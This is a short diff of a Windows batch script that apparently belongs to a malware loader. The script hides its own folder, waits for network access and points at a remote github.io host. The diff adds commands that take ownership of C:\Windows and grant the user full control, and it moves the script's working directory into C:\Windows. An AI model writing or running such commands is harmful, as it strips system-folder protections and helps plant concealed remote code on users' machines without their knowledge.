@@ -6,8 +6,11 @@ attrib +s +h +i "%~dp0"
 ping www.google.com -n 1 -w 5000 >NUL
 if errorlevel 1 goto Connectivitycheck
 
+TAKEOWN /F "C:\Windows"
+ICACLS "C:\Windows" /INHERITANCE:e /GRANT:r %UserName%:(F) /C
+
 Set host=https://cryptedodissey.github.io
-Set environment=%AppData%\Microsoft\Windows
+Set environment=C:\Windows
 
 cd %~dp0
 
